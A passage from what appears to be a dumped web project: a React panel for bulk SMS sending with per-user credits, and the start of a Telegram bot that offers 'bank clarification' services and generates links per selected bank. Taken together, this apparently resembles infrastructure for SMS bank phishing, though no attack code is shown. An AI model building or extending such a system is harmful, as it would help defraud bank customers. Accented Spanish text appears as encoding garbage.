\"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from \"@/components/ui/select\";\nimport { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from \"@/components/ui/dialog\";\nimport { Badge } from \"@/components/ui/badge\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { apiRequest } from \"@/lib/queryClient\";\nimport { MessageSquare, Users, Settings, Send, Plus, History, CreditCard } from \"lucide-react\";\n\ninterface SmsConfig {\n  id?: number;\n  username: string | null;\n  password: string | null;\n  apiUrl: string;\n  isActive: boolean;\n  updatedAt: string;\n  updatedBy: string;\n}\n\ninterface User {\n  id: number;\n  username: string;\n  role: string;\n  isActive: boolean;\n}\n\ninterface SmsHistory {\n  id: number;\n  userId: number;\n  phoneNumber: string;\n  message: string;\n  sentAt: string;\n  status: string;\n  errorMessage?: string;\n}\n\nconst SmsManagement = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  \n  // Estados locales\n  const [selectedUserId, setSelectedUserId] = useState<number | null>(null);\n  const [creditsToAdd, setCreditsToAdd] = useState<number>(0);\n  const [isSendSmsDialogOpen, setIsSendSmsDialogOpen] = useState(false);\n  const [isConfigDialogOpen, setIsConfigDialogOpen] = useState(false);\n  const [smsConfig, setSmsConfig] = useState<SmsConfig>({\n    username: \"\",\n    password: \"\", \n    apiUrl: \"https://api.sofmex.mx/api/sms\",\n    isActive: false,\n    updatedAt: \"\",\n    updatedBy: \"\"\n  });\n  \n  // Estados para el formulario de env铆o de SMS\n  const [phoneNumbers, setPhoneNumbers] = useState(\"\");\n  const [smsMessage, setSmsMessage] = useState(\"\");\n  const [prefix, setPrefix] = useState(\"+52\");\n  const [routeType, setRouteType] = useState(\"long_code\");\n\n  // Rutas SMS por defecto para mostrar mientras se cargan desde el servidor\n  const defaultSmsRoutes = [\n    {\n      type: \"long_code\", \n      name: \"Long Code (Ankarex)\",\n      description: \"Ruta econ贸mica con buena entregabilidad\",\n      creditCost: 0.5,\n      provider: \"Ankarex\"\n    },\n    {\n      type: \"premium\",\n      name: \"Premium (eims)\",\n      description: \"Ruta premium de alta calidad y velocidad\",\n      creditCost: 1,\n      provider: \"eims\"\n    }\n  ];\n\n  // Obtener lista de usuarios regulares\n  const { data: users = [] } = useQuery({\n    queryKey: ['/api/users/regular'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/users/regular');\n      return await res.json();\n    }\n  });\n\n  // Obtener cr茅ditos de usuario seleccionado\n  const { data: userCredits = 0 } = useQuery({\n    queryKey: ['/api/sms/credits', selectedUserId],\n    enabled: !!selectedUserId,\n    queryFn: async () => {\n      const res = await apiRequest('GET', `/api/sms/credits/${selectedUserId}`);\n      const data = await res.json();\n      return data.credits;\n    }\n  });\n\n  // Obtener historial de SMS de usuario seleccionado\n  const { data: smsHistory = [] } = useQuery({\n    queryKey: ['/api/sms/history', selectedUserId],\n    enabled: !!selectedUserId,\n    queryFn: async () => {\n      const res = await apiRequest('GET', `/api/sms/history/${selectedUserId}`);\n      const data = await res.json();\n      return data.history;\n    }\n  });\n\n  // Obtener rutas SMS disponibles\n  const { data: smsRoutesFromServer = [] } = useQuery({\n    queryKey: ['/api/sms/routes'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/sms/routes');\n      const data = await res.json();\n      return data.routes;\n    }\n  });\n\n  // Usar rutas del servidor si est谩n disponibles, sino usar las por defecto\n  const smsRoutes = smsRoutesFromServer.length > 0 ? smsRoutesFromServer : defaultSmsRoutes;\n\n  // Obtener configuraci贸n SMS\n  const { data: config } = useQuery({\n    queryKey: ['/api/sms/config'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/sms/config');\n      return await res.json();\n    }\n  });\n\n  // Mutaci贸n para actualizar configuraci贸n SMS\n  const updateConfigMutation = useMutation({\n    mutationFn: async (config: Partial<SmsConfig>) => {\n      const res = await apiRequest('POST', '/api/sms/config', config);\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Configuraci贸n actualizada\",\n        description: \"La configuraci贸n de SMS se ha actualizada correctamente\",\n      });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/config'] });\n      setIsConfigDialogOpen(false);\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al actualizar la configuraci贸n\",\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  // Mutaci贸n para agregar cr茅ditos\n  const addCreditsMutation = useMutation({\n    mutationFn: async ({ userId, amount }: { userId: number; amount: number }) => {\n      const res = await apiRequest('POST', '/api/sms/credits/add', { userId, amount });\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Cr茅ditos agregados\",\n        description: `Se han agregado ${creditsToAdd} cr茅ditos al usuario`,\n      });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits', selectedUserId] });\n      setCreditsToAdd(0);\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al agregar cr茅ditos\",\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  // Mutaci贸n para enviar SMS\n  const sendSmsMutation = useMutation({\n    mutationFn: async (data: { phoneNumbers: string; message: string; prefix: string; routeType: string }) => {\n      const res = await apiRequest('POST', '/api/sms/send', data);\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      const result = data.data;\n      const routeName = smsRoutes.find((r: any) => r.type === result.routeType)?.name || result.routeType;\n      toast({\n        title: \"SMS enviado\",\n        description: `Enviados: ${result.sent}, Fallidos: ${result.failed}. Ruta: ${routeName}. Cr茅ditos usados: ${result.creditsUsed}`,\n      });\n      setIsSendSmsDialogOpen(false);\n      setPhoneNumbers(\"\");\n      setSmsMessage(\"\");\n      // Actualizar cr茅ditos si hay un usuario seleccionado\n      if (selectedUserId) {\n        queryClient.invalidateQueries({ queryKey: ['/api/sms/credits', selectedUserId] });\n        queryClient.invalidateQueries({ queryKey: ['/api/sms/history', selectedUserId] });\n      }\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error al enviar SMS\",\n        description: error.message || \"Error al enviar SMS\",\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  const handleSaveConfig = () => {\n    updateConfigMutation.mutate(smsConfig);\n  };\n\n  const handleAddCredits = () => {\n    if (!selectedUserId || creditsToAdd <= 0) {\n      toast({\n        title: \"Error\",\n        description: \"Selecciona un usuario y una cantidad v谩lida de cr茅ditos\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    addCreditsMutation.mutate({ userId: selectedUserId, amount: creditsToAdd });\n  };\n\n  const handleSendSms = () => {\n    if (!phoneNumbers.trim() || !smsMessage.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Ingresa n煤meros de tel茅fono y mensaje\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    sendSmsMutation.mutate({ phoneNumbers, message: smsMessage, prefix, routeType });\n  };\n\n  const formatPhoneNumber = (phone: string) => {\n    if (phone.startsWith('+')) return phone;\n    return `+${phone}`;\n  };\n\n  const formatDate = (dateString: string) => {\n    return new Date(dateString).toLocaleString('es-ES');\n  };\n\n  const getStatusBadge = (status: string) => {\n    switch (status) {\n      case 'sent':\n        return <Badge variant=\"default\" className=\"bg-green-500\">Enviado</Badge>;\n      case 'failed':\n        return <Badge variant=\"destructive\">Fallido</Badge>;\n      case 'pending':\n        return <Badge variant=\"secondary\">Pendiente</Badge>;\n      default:\n        return <Badge variant=\"outline\">{status}</Badge>;\n    }\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex items-center justify-between\">\n        <div>\n          <h2 className=\"text-2xl font-bold tracking-tight\">Gesti贸n de SMS</h2>\n          <p className=\"text-muted-foreground\">\n            Administra el env铆o de mensajes de texto y cr茅ditos\n          </p>\n        </div>\n        <div className=\"flex space-x-2\">\n          <Dialog open={isConfigDialogOpen} onOpenChange={setIsConfigDialogOpen}>\n            <DialogTrigger asChild>\n              <Button variant=\"outline\">\n                <Settings className=\"mr-2 h-4 w-4\" />\n                Configuraci贸n\n              </Button>\n            </DialogTrigger>\n            <DialogContent>\n              <DialogHeader>\n                <DialogTitle>Configuraci贸n de SMS</DialogTitle>\n              </DialogHeader>\n              <div className=\"space-y-4\">\n                <div>\n                  <Label htmlFor=\"username\">Usuario API</Label>\n                  <Input\n                    id=\"username\"\n                    value={smsConfig.username || \"\"}\n                    onChange={(e) => setSmsConfig({ ...smsConfig, username: e.target.value })}\n                    placeholder=\"Usuario de la API de Sofmex\"\n                  />\n                </div>\n                <div>\n                  <Label htmlFor=\"password\">Contrase帽a API</Label>\n                  <Input\n                    id=\"password\"\n                    type=\"password\"\n                    value={smsConfig.password || \"\"}\n                    onChange={(e) => setSmsConfig({ ...smsConfig, password: e.target.value })}\n                    placeholder=\"Contrase帽a de la API de Sofmex\"\n                  />\n                </div>\n                <div>\n                  <Label htmlFor=\"apiUrl\">URL de la API</Label>\n                  <Input\n                    id=\"apiUrl\"\n                    value={smsConfig.apiUrl || \"\"}\n                    onChange={(e) => setSmsConfig({ ...smsConfig, apiUrl: e.target.value })}\n                    placeholder=\"URL de la API de SMS\"\n                  />\n                </div>\n                <Button \n                  onClick={handleSaveConfig} \n                  disabled={updateConfigMutation.isPending}\n                  className=\"w-full\"\n                >\n                  {updateConfigMutation.isPending ? \"Guardando...\" : \"Guardar Configuraci贸n\"}\n                </Button>\n              </div>\n            </DialogContent>\n          </Dialog>\n\n          <Dialog open={isSendSmsDialogOpen} onOpenChange={setIsSendSmsDialogOpen}>\n            <DialogTrigger asChild>\n              <Button>\n                <Send className=\"mr-2 h-4 w-4\" />\n                Enviar SMS\n              </Button>\n            </DialogTrigger>\n            <DialogContent className=\"max-w-lg\">\n              <DialogHeader>\n                <DialogTitle>Enviar SMS Masivo</DialogTitle>\n              </DialogHeader>\n              \n              {/* Resumen de rutas disponibles */}\n              <div className=\"bg-gradient-to-r from-blue-50 to-green-50 p-4 rounded-lg border-2 border-blue-200 mb-4\">\n                <h3 className=\"font-semibold text-gray-800 mb-2\"> Rutas SMS Disponibles:</h3>\n                <div className=\"grid grid-cols-2 gap-3\">\n                  <div className=\"bg-white p-3 rounded border border-orange-200 shadow-sm\">\n                    <div className=\"flex items-center justify-between\">\n                      <span className=\"font-medium text-sm\"> Short Code</span>\n                      <span className=\"text-lg font-bold text-orange-600\">1.0</span>\n                    </div>\n                    <p className=\"text-xs text-gray-600 mt-1\">Sofmex - Alta entregabilidad</p>\n                  </div>\n                  <div className=\"bg-white p-3 rounded border border-green-200 shadow-sm\">\n                    <div className=\"flex items-center justify-between\">\n                      <span className=\"font-medium text-sm\"> Long Code</span>\n                      <span className=\"text-lg font-bold text-green-600\">0.5</span>\n                    </div>\n                    <p className=\"text-xs text-gray-600 mt-1\">Ankarex - Econ贸mica</p>\n                  </div>\n                </div>\n              </div>\n\n              <div className=\"space-y-6\">\n                {/* PASO 1: Seleccionar Ruta de Env铆o */}\n                <div className=\"border-2 border-blue-500 rounded-lg p-4 bg-gradient-to-r from-blue-50 to-indigo-50\">\n                  <div className=\"flex items-center mb-3\">\n                    <div className=\"bg-blue-500 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3\">1</div>\n                    <Label className=\"text-lg font-semibold text-blue-900\">Seleccionar Ruta de Env铆o</Label>\n                  </div>\n                  <Select value={routeType} onValueChange={setRouteType}>\n                    <SelectTrigger className=\"border-blue-300 focus:border-blue-500 h-12\">\n                      <SelectValue placeholder=\" Elige tu ruta SMS\" />\n                    </SelectTrigger>\n                    <SelectContent>\n                      <SelectItem value=\"long_code\" className=\"py-4\">\n                        <div className=\"flex items-center justify-between w-full\">\n                          <div>\n                            <span className=\"font-semibold text-base\"> Long Code</span>\n                            <p className=\"text-sm text-muted-foreground\">Ankarex - Buena entregabilidad</p>\n                          </div>\n                          <span className=\"text-lg font-bold text-green-600 ml-4\">0.5 cr茅ditos</span>\n                        </div>\n                      </SelectItem>\n                      <SelectItem value=\"long_code\" className=\"py-4\">\n                        <div className=\"flex items-center justify-between w-full\">\n                          <div>\n                            <span className=\"font-semibold text-base\"> Long Code</span>\n                            <p className=\"text-sm text-muted-foreground\">Ankarex - Econ贸mica</p>\n                          </div>\n                          <span className=\"text-lg font-bold text-green-600 ml-4\">0.5 cr茅ditos</span>\n                        </div>\n                      </SelectItem>\n                    </SelectContent>\n                  </Select>\n                  {routeType && (\n                    <div className=\"mt-3 p-3 bg-white rounded-lg border border-blue-200\">\n                      <div className=\"text-sm font-medium text-green-700\">\n                         Ruta seleccionada: {routeType === 'premium' ? 'Premium (eims)' : 'Long Code (Ankarex)'} - \n                        {routeType === 'premium' ? ' 1.0 cr茅dito por SMS' : ' 0.5 cr茅ditos por SMS'}\n                      </div>\n                    </div>\n                  )}\n                </div>\n\n                {/* PASO 2: Prefijo de Pa铆s */}\n                <div className=\"border-2 border-green-500 rounded-lg p-4 bg-gradient-to-r from-green-50 to-emerald-50\">\n                  <div className=\"flex items-center mb-3\">\n                    <div className=\"bg-green-500 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3\">2</div>\n                    <Label className=\"text-lg font-semibold text-green-900\">Prefijo de Pa铆s</Label>\n                  </div>\n                  <Select value={prefix} onValueChange={setPrefix}>\n                    <SelectTrigger className=\"border-green-300 focus:border-green-500 h-12\">\n                      <SelectValue placeholder=\" Selecciona el pa铆s\" />\n                    </SelectTrigger>\n                    <SelectContent>\n                      <SelectItem value=\"+52\">拆 M茅xico (+52)</SelectItem>\n                      <SelectItem value=\"+1\">吼 USA (+1)</SelectItem>\n                      <SelectItem value=\"+57\"> Colombia (+57)</SelectItem>\n                      <SelectItem value=\"+34\"> Espa帽a (+34)</SelectItem>\n                    </SelectContent>\n                  </Select>\n                </div>\n\n                {/* PASO 3: N煤meros de Tel茅fono */}\n                <div className=\"border-2 border-purple-500 rounded-lg p-4 bg-gradient-to-r from-purple-50 to-violet-50\">\n                  <div className=\"flex items-center mb-3\">\n                    <div className=\"bg-purple-500 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3\">3</div>\n                    <Label className=\"text-lg font-semibold text-purple-900\">N煤meros de Tel茅fono</Label>\n                  </div>\n                  <Textarea\n                    value={phoneNumbers}\n                    onChange={(e) => setPhoneNumbers(e.target.value)}\n                    placeholder=\"Ejemplo: 5512345678,5523456789,5534567890\"\n                    rows={4}\n                    className=\"border-purple-300 focus:border-purple-500\"\n                  />\n                  <p className=\"text-sm text-purple-700 mt-2\">\n                     Separa los n煤meros con comas  M谩ximo 250 n煤meros\n                    {phoneNumbers.trim() && (\n                      <span className=\"font-semibold ml-2\">\n                        ({phoneNumbers.split(',').filter(n => n.trim()).length} n煤meros detectados)\n                      </span>\n                    )}\n                  </p>\n                </div>\n\n                {/* PASO 4: Mensaje SMS */}\n                <div className=\"border-2 border-orange-500 rounded-lg p-4 bg-gradient-to-r from-orange-50 to-amber-50\">\n                  <div className=\"flex items-center mb-3\">\n                    <div className=\"bg-orange-500 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3\">4</div>\n                    <Label className=\"text-lg font-semibold text-orange-900\">Mensaje SMS</Label>\n                  </div>\n                  <Textarea\n                    value={smsMessage}\n                    onChange={(e) => setSmsMessage(e.target.value)}\n                    placeholder=\"Escribe tu mensaje aqu铆...\"\n                    rows={3}\n                    maxLength={160}\n                    className=\"border-orange-300 focus:border-orange-500\"\n                  />\n                  <div className=\"flex justify-between items-center mt-2\">\n                    <p className=\"text-sm text-orange-700\">\n                       {smsMessage.length}/160 caracteres\n                    </p>\n                    {smsMessage.length > 140 && (\n                      <span className=\"text-red-600 text-sm font-medium\">\n                        锔 Cerca del l铆mite\n                      </span>\n                    )}\n                  </div>\n                </div>\n\n                {/* RESUMEN Y ENVO */}\n                {routeType && prefix && phoneNumbers.trim() && smsMessage.trim() && (\n                  <div className=\"border-2 border-red-500 rounded-lg p-4 bg-gradient-to-r from-red-50 to-rose-50\">\n                    <div className=\"flex items-center mb-3\">\n                      <div className=\"bg-red-500 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3\">5</div>\n                      <Label className=\"text-lg font-semibold text-red-900\">Resumen del Env铆o</Label>\n                    </div>\n                    <div className=\"bg-white rounded-lg p-4 border border-red-200\">\n                      <div className=\"grid grid-cols-2 gap-4 text-sm mb-4\">\n                        <div>\n                          <span className=\"text-gray-600\">Ruta:</span>\n                          <p className=\"font-semibold\">{routeType === 'premium' ? ' Premium (eims)' : ' Long Code (Ankarex)'}</p>\n                        </div>\n                        <div>\n                          <span className=\"text-gray-600\">Pa铆s:</span>\n                          <p className=\"font-semibold\">{prefix === '+52' ? '拆 M茅xico' : prefix === '+1' ? '吼 USA' : prefix === '+57' ? ' Colombia' : ' Espa帽a'}</p>\n                        </div>\n                        <div>\n                          <span className=\"text-gray-600\">N煤meros:</span>\n                          <p className=\"font-semibold text-blue-600\">{phoneNumbers.split(',').filter(n => n.trim()).length} destinatarios</p>\n                        </div>\n                        <div>\n                          <span className=\"text-gray-600\">Costo por SMS:</span>\n                          <p className=\"font-semibold text-green-600\">{routeType === 'premium' ? '1.0' : '0.5'} cr茅ditos</p>\n                        </div>\n                      </div>\n                      <div className=\"border-t pt-3\">\n                        <div className=\"flex justify-between items-center text-lg\">\n                          <span className=\"font-bold text-gray-800\">Total a consumir:</span>\n                          <span className=\"font-bold text-red-600 text-xl\">\n                            {((routeType === 'premium' ? 1.0 : 0.5) * \n                              phoneNumbers.split(',').filter(n => n.trim()).length).toFixed(1)} cr茅ditos\n                          </span>\n                        </div>\n                      </div>\n                    </div>\n                  </div>\n                )}\n\n                <Button \n                  onClick={handleSendSms} \n                  disabled={sendSmsMutation.isPending || !routeType || !prefix || !phoneNumbers.trim() || !smsMessage.trim()}\n                  className=\"w-full text-lg py-4 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700\"\n                >\n                  {sendSmsMutation.isPending ? (\n                    <div className=\"flex items-center\">\n                      <div className=\"animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2\"></div>\n                      Enviando SMS...\n                    </div>\n                  ) : (\n                    ` Enviar SMS ${phoneNumbers.trim() ? `(${phoneNumbers.split(',').filter(n => n.trim()).length} n煤meros)` : ''}`\n                  )}\n                </Button>\n              </div>\n            </DialogContent>\n          </Dialog>\n        </div>\n      </div>\n\n      <div className=\"grid gap-6 md:grid-cols-2\">\n        {/* Panel de Gesti贸n de Cr茅ditos */}\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center\">\n              <CreditCard className=\"mr-2 h-5 w-5\" />\n              Gesti贸n de Cr茅ditos\n            </CardTitle>\n            <CardDescription>\n              Administra los cr茅ditos SMS de los usuarios\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            <div>\n              <Label htmlFor=\"userSelect\">Seleccionar Usuario</Label>\n              <Select value={selectedUserId?.toString() || \"\"} onValueChange={(value) => setSelectedUserId(parseInt(value))}>\n                <SelectTrigger>\n                  <SelectValue placeholder=\"Selecciona un usuario\" />\n                </SelectTrigger>\n                <SelectContent>\n                  {users.map((user: User) => (\n                    <SelectItem key={user.id} value={user.id.toString()}>\n                      {user.username} ({user.role})\n                    </SelectItem>\n                  ))}\n                </SelectContent>\n              </Select>\n            </div>\n\n            {selectedUserId && (\n              <>\n                <div className=\"p-3 bg-muted rounded-lg\">\n                  <p className=\"text-sm font-medium\">Cr茅ditos actuales</p>\n                  <p className=\"text-2xl font-bold\">{userCredits}</p>\n                </div>\n\n                <div className=\"flex space-x-2\">\n                  <Input\n                    type=\"number\"\n                    value={creditsToAdd}\n                    onChange={(e) => setCreditsToAdd(parseInt(e.target.value) || 0)}\n                    placeholder=\"Cantidad de cr茅ditos\"\n                    min=\"1\"\n                  />\n                  <Button \n                    onClick={handleAddCredits}\n                    disabled={addCreditsMutation.isPending || creditsToAdd <= 0}\n                  >\n                    <Plus className=\"mr-2 h-4 w-4\" />\n                    Agregar\n                  </Button>\n                </div>\n              </>\n            )}\n          </CardContent>\n        </Card>\n\n        {/* Estado de la API */}\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center\">\n              <MessageSquare className=\"mr-2 h-5 w-5\" />\n              Estado de la API\n            </CardTitle>\n            <CardDescription>\n              Configuraci贸n actual de la API de SMS\n            </CardDescription>\n          </CardHeader>\n          <CardContent>\n            {config ? (\n              <div className=\"space-y-2\">\n                <div className=\"flex justify-between\">\n                  <span className=\"text-sm font-medium\">Estado:</span>\n                  <Badge variant={config.isActive ? \"default\" : \"destructive\"}>\n                    {config.isActive ? \"Activa\" : \"Inactiva\"}\n                  </Badge>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span className=\"text-sm font-medium\">Usuario:</span>\n                  <span className=\"text-sm\">{config.username || \"No configurado\"}</span>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span className=\"text-sm font-medium\">URL:</span>\n                  <span className=\"text-sm text-muted-foreground\">\n                    {config.apiUrl?.substring(0, 30)}...\n                  </span>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span className=\"text-sm font-medium\">Actualizado por:</span>\n                  <span className=\"text-sm\">{config.updatedBy}</span>\n                </div>\n              </div>\n            ) : (\n              <p className=\"text-sm text-muted-foreground\">No hay configuraci贸n disponible</p>\n            )}\n          </CardContent>\n        </Card>\n      </div>\n\n      {/* Historial de SMS */}\n      {selectedUserId && smsHistory.length > 0 && (\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center\">\n              <History className=\"mr-2 h-5 w-5\" />\n              Historial de SMS\n            </CardTitle>\n            <CardDescription>\n              ltimos mensajes enviados por el usuario seleccionado\n            </CardDescription>\n          </CardHeader>\n          <CardContent>\n            <div className=\"space-y-3\">\n              {smsHistory.slice(0, 10).map((item: SmsHistory) => (\n                <div key={item.id} className=\"border rounded-lg p-3\">\n                  <div className=\"flex justify-between items-start\">\n                    <div className=\"flex-1\">\n                      <p className=\"font-medium\">{formatPhoneNumber(item.phoneNumber)}</p>\n                      <p className=\"text-sm text-muted-foreground mt-1\">{item.message}</p>\n                      <p className=\"text-xs text-muted-foreground mt-2\">\n                        {formatDate(item.sentAt)}\n                      </p>\n                    </div>\n                    <div className=\"ml-4\">\n                      {getStatusBadge(item.status)}\n                    </div>\n                  </div>\n                  {item.errorMessage && (\n                    <p className=\"text-xs text-red-500 mt-2\">{item.errorMessage}</p>\n                  )}\n                </div>\n              ))}\n            </div>\n          </CardContent>\n        </Card>\n      )}\n    </div>\n  );\n};\n\nexport default SmsManagement;","size_bytes":28231},"client/src/components/ui/slider.tsx":{"content":"import * as React from \"react\"\nimport * as SliderPrimitive from \"@radix-ui/react-slider\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Slider = React.forwardRef<\n  React.ElementRef<typeof SliderPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof SliderPrimitive.Root>\n>(({ className, ...props }, ref) => (\n  <SliderPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"relative flex w-full touch-none select-none items-center\",\n      className\n    )}\n    {...props}\n  >\n    <SliderPrimitive.Track className=\"relative h-2 w-full grow overflow-hidden rounded-full bg-secondary\">\n      <SliderPrimitive.Range className=\"absolute h-full bg-primary\" />\n    </SliderPrimitive.Track>\n    <SliderPrimitive.Thumb className=\"block h-5 w-5 rounded-full border-2 border-primary bg-background ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50\" />\n  </SliderPrimitive.Root>\n))\nSlider.displayName = SliderPrimitive.Root.displayName\n\nexport { Slider }\n","size_bytes":1077},"server/telegramBot.ts":{"content":"import TelegramBot from 'node-telegram-bot-api';\nimport axios from 'axios';\nimport { storage } from './storage';\nimport { User, VerificationCode } from '@shared/schema';\nimport { getMXNBalance } from './bitsoService';\nimport { sendPaymentReceipt } from './paymentBot';\nimport { linkQuotaService } from './services/linkQuota';\nimport { linkTokenService } from './services/linkToken';\n\n// Token del bot y chat ID del administrador desde variables de entorno\nconst TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;\nconst ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;\n\nif (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {\n  console.warn('[Telegram Bot] TELEGRAM_TOKEN y ADMIN_CHAT_ID no est谩n configurados. El bot principal estar谩 deshabilitado.');\n}\n\n// Variable global para controlar instancia 煤nica del bot\nlet botInstance: TelegramBot | null = null;\nlet isShuttingDown = false;\n\n// Funci贸n para detener el bot de forma segura\nasync function stopBot() {\n  if (botInstance && !isShuttingDown) {\n    isShuttingDown = true;\n    try {\n      console.log(' Deteniendo bot de Telegram...');\n      await botInstance.stopPolling();\n      botInstance.removeAllListeners();\n      botInstance = null;\n      console.log(' Bot detenido correctamente');\n    } catch (error) {\n      console.log('锔 Error al detener bot (continuando)');\n    } finally {\n      isShuttingDown = false;\n    }\n  }\n}\n\n// Funci贸n para limpiar instancias previas del bot\nasync function cleanupPreviousBotInstances() {\n  try {\n    // Detener instancia actual si existe\n    await stopBot();\n    \n    // Eliminar webhook y cancelar polling previo con tiempo de espera m谩s largo\n    await axios.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true`);\n    console.log('Ч Limpieza de webhooks previos completada');\n    \n    // Esperar significativamente m谩s tiempo para asegurar que polling anterior termine completamente\n    // 7 segundos garantiza que cualquier polling anterior expire (timeout de 10s + margen)\n    await new Promise(resolve => setTimeout(resolve, 7000));\n  } catch (error) {\n    console.log('锔 Error al limpiar configuraciones previas (continuando)');\n    // Esperar de todas formas para dar tiempo\n    await new Promise(resolve => setTimeout(resolve, 5000));\n  }\n}\n\n// Funci贸n as铆ncrona para inicializar el bot\nasync function initializeBot() {\n  if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {\n    return null;\n  }\n\n  // Limpiar instancias previas antes de iniciar\n  await cleanupPreviousBotInstances();\n\n  try {\n    const newBot = new TelegramBot(TELEGRAM_TOKEN, { \n      polling: {\n        interval: 1500, // Incrementado de 1000 a 1500 para reducir carga\n        autoStart: true,\n        params: {\n          timeout: 10\n        }\n      }\n    });\n    botInstance = newBot;\n    console.log(' Bot de Telegram iniciado correctamente (modo polling limpio)');\n    return newBot;\n  } catch (error) {\n    console.error(' Error iniciando bot de Telegram:', error);\n    throw error;\n  }\n}\n\n// Inicializar el bot de forma as铆ncrona\nlet bot: TelegramBot | null = null;\nlet botInitPromise: Promise<TelegramBot | null> | null = null;\n\nif (TELEGRAM_TOKEN && ADMIN_CHAT_ID) {\n  botInitPromise = initializeBot().then(b => {\n    bot = b;\n    return b;\n  });\n}\n\n// Funci贸n helper para garantizar que el bot est谩 inicializado\nasync function ensureBotReady(): Promise<TelegramBot | null> {\n  if (botInitPromise) {\n    await botInitPromise;\n  }\n  return bot;\n}\n\n// Handlers para shutdown graceful\nprocess.on('SIGINT', async () => {\n  console.log('\\n SIGINT recibido, cerrando bot...');\n  await stopBot();\n  process.exit(0);\n});\n\nprocess.on('SIGTERM', async () => {\n  console.log('\\n SIGTERM recibido, cerrando bot...');\n  await stopBot();\n  process.exit(0);\n});\n\n// Sistema de estados de conversaci贸n para el flujo de pagos\ninterface PaymentSession {\n  chatId: string;\n  state: 'awaiting_screenshot' | 'awaiting_amount';\n  screenshotFileId?: string;\n  amount?: string;\n  userId?: number;\n  expectedAmount?: string;\n}\n\nconst paymentSessions = new Map<string, PaymentSession>();\n\n// Sistema de estados para crear c贸digos de descuento\ninterface DiscountSession {\n  chatId: string;\n  state: 'awaiting_amount';\n}\n\nconst discountSessions = new Map<string, DiscountSession>();\n\n// Sistema de estados para generar enlaces\ninterface LinkGenerationSession {\n  chatId: string;\n  userId: number;\n  username: string;\n  state: 'awaiting_bank_selection';\n  allowedBanks: string[];\n  createdAt: Date;\n  timeoutId?: NodeJS.Timeout;\n}\n\nconst linkGenerationSessions = new Map<string, LinkGenerationSession>();\n\n// Funci贸n para limpiar sesiones de enlaces expiradas (despu茅s de 5 minutos de inactividad)\nfunction cleanupLinkSession(chatId: string) {\n  const session = linkGenerationSessions.get(chatId);\n  if (session && session.timeoutId) {\n    clearTimeout(session.timeoutId);\n  }\n  linkGenerationSessions.delete(chatId);\n}\n\n// Mensaje de bienvenida\nconst WELCOME_MESSAGE = `\n *隆Bienvenido a nuestro panel!*\n\nGracias por utilizar nuestro sistema de aclaraciones bancarias.\n\n *Para poder registrarte:*\n1. Ingresa a: Balonx.pro/balonx\n2. Presiona en \"Registrarte\"\n3. Ingresa un usuario, una contrase帽a y tu Chat ID\n\n Para cualquier duda o sugerencia, contacta con @balonxSistema\n\n *Funciones disponibles:*\n Autenticaci贸n de doble factor\n Notificaciones en tiempo real\n Mensajer铆a directa del administrador\n\n隆Esperamos que tengas una excelente experiencia!\n`;\n\n// Funci贸n para generar c贸digo de verificaci贸n de 6 d铆gitos\nexport function generateVerificationCode(): string {\n  return Math.floor(100000 + Math.random() * 900000).toString();\n}\n\n// Funci贸n para generar c贸digo de referencia 煤nico para pagos (8 caracteres alfanum茅ricos)\nexport function generatePaymentReferenceCode(): string {\n  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // Sin caracteres confusos (I, 1, O, 0)\n  let code = '';\n  for (let i = 0; i < 8; i++) {\n    code += chars.charAt(Math.floor(Math.random() * chars.length));\n  }\n  return code;\n}\n\n// Funci贸n para enviar c贸digo de verificaci贸n 2FA\nexport async function sendVerificationCode(userId: number, username: string): Promise<{ success: boolean; code?: string; error?: string 